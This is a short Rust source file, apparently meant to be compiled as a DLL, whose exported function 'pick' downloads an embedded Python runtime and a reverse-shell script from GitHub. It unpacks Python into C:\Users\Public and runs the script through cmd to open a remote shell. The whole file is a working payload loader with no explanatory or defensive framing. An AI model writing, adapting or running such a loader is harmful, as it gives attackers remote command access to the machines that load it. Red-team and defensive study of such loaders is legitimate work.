#[no_mangle]
pub extern "C" fn pick() {

    extern crate reqwest;
    extern crate zip_extract;
    use std::path::PathBuf;
    use std::io::Cursor;
    use std::process::Command;
    type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;
    #[tokio::main]

    async fn apick() {
        
        async fn fetch_url(url: String, file_name: String) -> Result<()> {
            let response = reqwest::get(url).await?;
            let mut file = std::fs::File::create(file_name)?;
            let mut content =  Cursor::new(response.bytes().await?);
            std::io::copy(&mut content, &mut file)?;
            Ok(())
        }
        
        fetch_url("https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip".to_string(), "python.zip".to_string()).await.unwrap();
        //fetch rev shell script
        fetch_url("https://raw.githubusercontent.com/Teach2Breach/Python-Windows-Reverse-Shell/master/reverse_shell.py".to_string(), "rev.py".to_string()).await.unwrap();


        let archive: Vec<u8> = std::fs::read("python.zip").unwrap();
        let target_dir = PathBuf::from("C:\\Users\\Public\\python-3.10.4-embed-amd64");

        //unzip python.zip to C:\Users\user\AppData\Local\Temp\inline_python\python-3.10.4-embed-amd64 using Rust
        zip_extract::extract(Cursor::new(archive), &target_dir, true).unwrap();

        //run pythonw.exe and open a reverse shell
        Command::new(r"C:\Users\Public\python-3.10.4-embed-amd64\python.exe")
            .arg("--version");

            let output =  {
                Command::new("cmd")
                        .args(["/C", r"C:\Users\Public\python-3.10.4-embed-amd64\python.exe rev.py"])
                        .output()
                        .expect("failed to execute process")
            } ;        
            let hello = String::from_utf8_lossy(&output.stdout);

            println!("{}", hello);
        
    }

    apick();

}